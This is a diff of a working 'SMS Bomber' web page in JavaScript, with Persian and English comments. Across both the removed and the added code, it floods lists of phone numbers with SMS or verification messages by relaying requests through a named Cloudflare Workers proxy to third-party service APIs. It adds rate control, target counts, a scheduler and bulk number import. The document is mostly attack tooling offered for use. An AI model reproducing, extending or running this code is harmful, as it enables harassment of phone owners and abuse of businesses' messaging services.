+        let stats = { total:0, success:0, fail:0 }, stopFlag = false, startTime = 0;
+        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev'; // ← جایگزین کنید
+        document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
+        let chartInstance = null;
 
-    function updateStats() {
-      document.getElementById('total').innerText = stats.total;
-      document.getElementById('success').innerText = stats.success;
-      document.getElementById('fail').innerText = stats.fail;
-      const elapsed = (Date.now() - startTime) / 1000;
-      const rate = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
-      document.getElementById('rateDisp').innerText = rate;
-      const percent = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
-      document.getElementById('percent').innerText = percent + '%';
-      // تخمین زمان باقی‌مانده
-      const target = parseInt(document.getElementById('target').value) || 0;
-      if (target > 0 && stats.total > 0 && stats.success < target) {
-        const remaining = target - stats.success;
-        const secLeft = Math.round(remaining / (rate || 1));
-        document.getElementById('eta').innerText = secLeft + ' ثانیه';
-      } else {
-        document.getElementById('eta').innerText = '--';
-      }
-      // نمودار
-      if (chartInstance) {
-        chartInstance.data.datasets[0].data.push(stats.success);
-        chartInstance.data.datasets[1].data.push(stats.fail);
-        chartInstance.data.labels.push(stats.total);
-        if (chartInstance.data.labels.length > 30) {
-          chartInstance.data.labels.shift();
-          chartInstance.data.datasets[0].data.shift();
-          chartInstance.data.datasets[1].data.shift();
+        function log(msg) {
+            const time = new Date().toLocaleTimeString(lang === 'fa' ? 'fa-IR' : 'en-US');
+            document.getElementById('logBox').innerHTML += `[${time}] ${msg}\n`;
+            document.getElementById('logBox').scrollTop = document.getElementById('logBox').scrollHeight;
         }
-        chartInstance.update();
-      }
-    }
-
-    async function sendViaProxy(api, phone, proxyUrl) {
-      const url = api.url.replace('{phone}', phone);
-      const method = api.method || 'GET';
-      let body = api.body ? api.body.replace('{phone}', phone) : null;
-      const resp = await fetch(proxyUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url, method, headers: {'Content-Type':'application/json'}, body })
-      });
-      if (resp.ok) {
-        const data = await resp.json().catch(() => ({}));
-        if (data.error || (data.message && /failed|error/i.test(data.message))) return false;
-        return true;
-      }
-      return false;
-    }
-
-    class TokenBucket {
-      constructor(rate) {
-        this.rate = rate;
-        this.tokens = 0;
-        this.lastTime = Date.now();
-      }
-      async consume() {
-        const now = Date.now();
-        this.tokens += ((now - this.lastTime) / 1000) * this.rate;
-        this.lastTime = now;
-        if (this.tokens > this.rate) this.tokens = this.rate;
-        if (this.tokens >= 1) {
-          this.tokens -= 1;
-        } else {
-          const wait = ((1 - this.tokens) / this.rate) * 1000;
-          await new Promise(r => setTimeout(r, wait));
-          this.tokens = 0;
-          this.lastTime = Date.now();
+        function updateStats() {
+            document.getElementById('total').innerText = stats.total;
+            document.getElementById('success').innerText = stats.success;
+            document.getElementById('fail').innerText = stats.fail;
+            const elapsed = (Date.now() - startTime)/1000;
+            const rate = elapsed>0 ? (stats.total/elapsed).toFixed(1) : 0;
+            document.getElementById('rateDisp').innerText = rate;
+            const percent = stats.total>0 ? ((stats.success/stats.total)*100).toFixed(1) : 0;
+            document.getElementById('percent').innerText = percent+'%';
+            const target = parseInt(document.getElementById('target').value)||0;
+            document.getElementById('eta').innerText = (target>0 && stats.total>0 && stats.success<target) ? Math.round((target-stats.success)/(rate||1))+'s' : '--';
+            if (chartInstance) {
+                chartInstance.data.labels.push(stats.total);
+                chartInstance.data.datasets[0].data.push(stats.success);
+                chartInstance.data.datasets[1].data.push(stats.fail);
+                if (chartInstance.data.labels.length>30) { chartInstance.data.labels.shift(); chartInstance.data.datasets[0].data.shift(); chartInstance.data.datasets[1].data.shift(); }
+                chartInstance.update();
+            }
         }
-      }
-    }
-
-    async function runAttack(phone, rate, target, proxyUrl) {
-      const bucket = new TokenBucket(rate);
-      const tasks = [];
-      for (const api of API_TEMPLATES) {
-        if (stopFlag) break;
-        const capacity = api.capacity || 0;
-        if (capacity <= 0) continue;
-        for (let i = 0; i < capacity; i++) {
-          if (stopFlag) break;
-          tasks.push(api);
+        async function sendViaProxy(api, phone, proxyUrl) {
+            const url = api.url.replace('{phone}', phone);
+            const method = api.method||'GET';
+            let body = api.body ? api.body.replace('{phone}', phone) : null;
+            const resp = await fetch(proxyUrl, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({url, method, headers:{'Content-Type':'application/json'}, body})
+            });
+            if (resp.ok) {
+                const data = await resp.json().catch(()=>({}));
+                if (data.error || (data.message && /failed|error/i.test(data.message))) return false;
+                return true;
+            }
+            return false;
         }
-      }
-      log(`📱 ارسال به ${phone} | 📋 ${tasks.length} درخواست`);
-      for (const api of tasks) {
-        if (stopFlag || (target && stats.success >= target)) break;
-        await bucket.consume();
-        try {
-          const ok = await sendViaProxy(api, phone, proxyUrl);
-          stats.total++;
-          if (ok) stats.success++; else stats.fail++;
-          updateStats();
-          const progress = target ? (stats.success / target * 100) : (stats.total / tasks.length * 100);
-          document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
-        } catch (e) {
-          stats.total++; stats.fail++;
-          updateStats();
+        class TokenBucket {
+            constructor(rate){ this.rate=rate; this.tokens=0; this.lastTime=Date.now(); }
+            async consume(){
+                const now=Date.now(); this.tokens+=((now-this.lastTime)/1000)*this.rate; this.lastTime=now;
+                if(this.tokens>this.rate) this.tokens=this.rate;
+                if(this.tokens>=1){ this.tokens-=1; }
+                else{
+                    const wait = ((1-this.tokens)/this.rate)*1000;
+                    await new Promise(r=>setTimeout(r,wait));
+                    this.tokens=0; this.lastTime=Date.now();
+                }
+            }
         }
-        if (target && stats.success >= target) {
-          log(`🎯 به هدف ${target} رسیدیم`);
-          break;
+        async function runAttack(phone,rate,target,proxyUrl){
+            const bucket=new TokenBucket(rate);
+            const tasks=[];
+            for(const api of API_TEMPLATES){
+                if(stopFlag) break;
+                const cap=api.capacity||0; if(cap<=0) continue;
+                for(let i=0;i<cap;i++){ if(stopFlag) break; tasks.push(api); }
+            }
+            log(`📱 Sending to ${phone} | ${tasks.length} requests`);
+            for(const api of tasks){
+                if(stopFlag||(target&&stats.success>=target)) break;
+                await bucket.consume();
+                try{
+                    const ok=await sendViaProxy(api,phone,proxyUrl);
+                    stats.total++;
+                    if(ok) stats.success++; else stats.fail++;
+                    updateStats();
+                    const progress=target?(stats.success/target*100):(stats.total/tasks.length*100);
+                    document.getElementById('progressBar').style.width=Math.min(progress,100)+'%';
+                }catch(e){ stats.total++; stats.fail++; updateStats(); }
+                if(target&&stats.success>=target){ log(`🎯 Target reached`); break; }
+            }
         }
-      }
-    }
-
-    async function processPhoneList(phones, rate, target, proxyUrl) {
-      for (const phone of phones) {
-        if (stopFlag) break;
-        await runAttack(phone, rate, target ? Math.ceil(target / phones.length) : null, proxyUrl);
-      }
-      log('🏁 پایان همه شماره‌ها');
-      if (Notification.permission === 'granted') new Notification('SMS Bomber', { body: 'عملیات پایان یافت' });
-      document.getElementById('progressBar').style.width = '100%';
-      document.getElementById('startBtn').disabled = false;
-      document.getElementById('stopBtn').disabled = true;
-    }
-
-    function startAttack() {
-      // کلید دسترسی
-      const urlParams = new URLSearchParams(window.location.search);
-      const key = urlParams.get('key');
-      if (!key) {
-        const entered = prompt('کلید دسترسی را وارد کنید:');
-        if (entered !== 'YOUR_SECRET_KEY') { alert('کلید نادرست'); return; }
-      }
-      // جمع‌آوری شماره‌ها
-      const phonesText = document.getElementById('phonesInput').value.trim();
-      let phones = phonesText ? phonesText.split(/[,\n]+/).map(p=>p.trim()).filter(p=>/^09\d{9}$/.test(p)) : [];
-      if (phones.length === 0) {
-        alert('حداقل یک شماره معتبر وارد کنید');
-        return;
-      }
-      const rate = parseInt(document.getElementById('rateSlider').value);
-      const target = parseInt(document.getElementById('target').value) || 0;
-      const scheduler = parseInt(document.getElementById('scheduler').value) || 0;
-      const useProxy = document.getElementById('useProxy').checked;
-      const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
-      if (useProxy && !proxyUrl) { alert('آدرس پروکسی را وارد کنید'); return; }
-      localStorage.setItem('proxyUrl', proxyUrl);
-
-      stats = { total:0, success:0, fail:0 };
-      stopFlag = false;
-      startTime = Date.now();
-      document.getElementById('logBox').innerHTML = '';
-      document.getElementById('progressBar').style.width = '0%';
-      document.getElementById('startBtn').disabled = true;
-      document.getElementById('stopBtn').disabled = false;
-
-      // زمان‌بندی
-      const doAttack = () => processPhoneList(phones, rate, target, proxyUrl);
-      if (scheduler > 0) {
-        log(`⏰ شروع خودکار در ${scheduler} ثانیه دیگر`);
-        setTimeout(doAttack, scheduler * 1000);
-      } else {
-        doAttack();
-      }
-      // راه‌اندازی نمودار
-      if (chartInstance) chartInstance.destroy();
-      const ctx = document.getElementById('liveChart').getContext('2d');
-      chartInstance = new Chart(ctx, {
-        type: 'line',
-        data: {
-          labels: [],
-          datasets: [
-            { label: 'موفق', borderColor: 'green', data: [] },
-            { label: 'خطا', borderColor: 'red', data: [] }
-          ]
-        },
-        options: { animation: false, scales: { x: { display: false } } }
-      });
-      // درخواست اعلان
-      if ('Notification' in window) Notification.requestPermission();
-    }
-
-    function stopAttack() {
-      stopFlag = true;
-      log('🛑 توقف');
-      document.getElementById('stopBtn').disabled = true;
-    }
-
-    function resetForm() {
-      document.getElementById('phonesInput').value = '';
-      document.getElementById('rateSlider').value = 5;
-      document.getElementById('rateVal').innerText = '5';
-      document.getElementById('target').value = '';
-      stats = { total:0, success:0, fail:0 };
-      updateStats();
-      document.getElementById('progressBar').style.width = '0%';
-      document.getElementById('logBox').innerHTML = '⏳ آماده...';
-      if (chartInstance) { chartInstance.destroy(); chartInstance = null; }
-    }
-
-    function loadPhonesFile() {
-      const file = document.getElementById('phonesFile').files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = (e) => {
-        document.getElementById('phonesInput').value = e.target.result;
-      };
-      reader.readAsText(file);
-    }
-
-    function toggleProxyInput() {
-      // nothing special needed
-    }
-
-    function switchTab(tab) {
-      document.getElementById('statsPanel').style.display = tab==='stats' ? 'block' : 'none';
-      document.getElementById('chartPanel').style.display = tab==='chart' ? 'block' : 'none';
-      document.getElementById('logBox').style.display = tab==='log' ? 'block' : 'none';
-      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-      event.target.classList.add('active');
-    }
-
-    // مقداردهی اولیه
-    document.getElementById('proxyUrl').value = DEFAULT_PROXY;
-    loadProfileList();
-    updateStats();
-  </script>
+        async function processPhoneList(phones,rate,target,proxyUrl){
+            for(const phone of phones){
+                if(stopFlag) break;
+                await runAttack(phone,rate,target?Math.ceil(target/phones.length):null,proxyUrl);
+            }
+            log('🏁 All done');
+            if(Notification.permission==='granted') new Notification('SMS Bomber',{body:'Operation finished.'});
+            document.getElementById('startBtn').disabled=false;
+            document.getElementById('stopBtn').disabled=true;
+            document.getElementById('progressBar').style.width='100%';
+        }
+        function startAttack(){
+            const key = new URLSearchParams(window.location.search).get('key');
+            if(!key){ alert('Access key required in URL (?key=...)'); return; }
+            const phonesText = document.getElementById('phonesInput').value.trim();
+            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p=>p.trim()).filter(p=>/^09\d{9}$/.test(p)) : [];
+            if(phones.length===0){ alert('Enter at least one valid phone number'); return; }
+            const rate=parseInt(document.getElementById('rateSlider').value);
+            const target=parseInt(document.getElementById('target').value)||0;
+            const scheduler=parseInt(document.getElementById('scheduler').value)||0;
+            const useProxy=document.getElementById('useProxy').checked;
+            const proxyUrl=useProxy ? document.getElementById('proxyUrl').value.trim() : null;
+            if(useProxy && !proxyUrl){ alert('Proxy URL required'); return; }
+            localStorage.setItem('proxyUrl',proxyUrl);
+            stats={total:0,success:0,fail:0}; stopFlag=false; startTime=Date.now();
+            document.getElementById('logBox').innerHTML='';
+            document.getElementById('progressBar').style.width='0%';
+            document.getElementById('startBtn').disabled=true;
+            document.getElementById('stopBtn').disabled=false;
+            if(chartInstance) chartInstance.destroy();
+            const ctx=document.getElementById('liveChart').getContext('2d');
+            chartInstance=new Chart(ctx,{
+                type:'line',
+                data:{labels:[],datasets:[{label:'Success',borderColor:'green',data:[]},{label:'Fail',borderColor:'red',data:[]}]},
+                options:{animation:false,scales:{x:{display:false}}}
+            });
+            if('Notification' in window) Notification.requestPermission();
+            const go=()=>processPhoneList(phones,rate,target,proxyUrl);
+            if(scheduler>0){ log(`⏰ Scheduled start in ${scheduler}s`); setTimeout(go,scheduler*1000); }
+            else go();
+        }
+        function stopAttack(){ stopFlag=true; document.getElementById('stopBtn').disabled=true; }
+        function resetAll(){
+            document.getElementById('phonesInput').value='';
+            document.getElementById('rateSlider').value=5; document.getElementById('rateVal').innerText='5';
+            document.getElementById('target').value='';
+            stats={total:0,success:0,fail:0}; updateStats();
+            document.getElementById('progressBar').style.width='0%';
+            document.getElementById('logBox').innerHTML=texts[lang].logReady;
+            if(chartInstance){ chartInstance.destroy(); chartInstance=null; }
+            document.getElementById('startBtn').disabled=false;
+        }
+        function loadPhonesFile(){
+            const file=document.getElementById('phonesFile').files[0];
+            if(!file) return;
+            const reader=new FileReader();
+            reader.onload=e=>{ document.getElementById('phonesInput').value=e.target.result; };
+            reader.readAsText(file);
+        }
+        function switchTab(tab){
+            document.getElementById('statsPanel').style.display=tab==='stats'?'block':'none';
+            document.getElementById('chartPanel').style.display=tab==='chart'?'block':'none';
+            document.getElementById('logPanel').style.display=tab==='log'?'block':'none';
+            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+        function showHelp(){ document.getElementById('helpModal').style.display='flex'; }
+        // راه‌اندازی
+        loadProfileList();
+        updateStats();
+    </script>
 </body>
 </html>
